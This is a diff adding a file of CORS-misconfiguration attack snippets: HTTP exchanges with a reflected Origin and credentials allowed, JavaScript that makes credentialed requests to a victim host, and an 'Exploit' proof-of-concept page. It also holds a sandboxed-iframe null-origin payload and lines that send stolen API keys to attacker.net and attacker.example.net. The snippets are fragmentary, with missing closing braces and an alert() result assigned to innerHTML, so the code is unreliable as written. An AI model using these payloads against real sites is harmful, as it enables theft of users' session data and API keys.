@@ -1,0 +1,51 @@
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: https://evil.com
+Cookie: sessionid=...
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+{"[private API key]"}
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://victim.example.com/endpoint',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+location='//attacker.net/log?key='+this.responseText;
+<html>
+<body>
+<h2>CORS PoC</h2>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script>
+function cors() {
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+xhr.open("GET",
+"https://victim.example.com/endpoint", true);
+xhr.withCredentials = true;
+xhr.send();
+</script>
+</body>
+</html>
+Origin: null
+Access-Control-Allow-Origin: null
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
+</script>"></iframe>
+https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
+* is the only wildcard origin
+https://*.example.com is not valid
+Host: api.internal.example.com
+Access-Control-Allow-Origin: *
+req.open('get','https://api.internal.example.com/endpoint',true);
+Host: api.example.com
+Origin: https://evilexample.com
+Access-Control-Allow-Origin: https://evilexample.com
+req.open('get','https://api.example.com/endpoint',true);
+Origin: https://apiiexample.com
+Access-Control-Allow-Origin: https://apiiexample.com
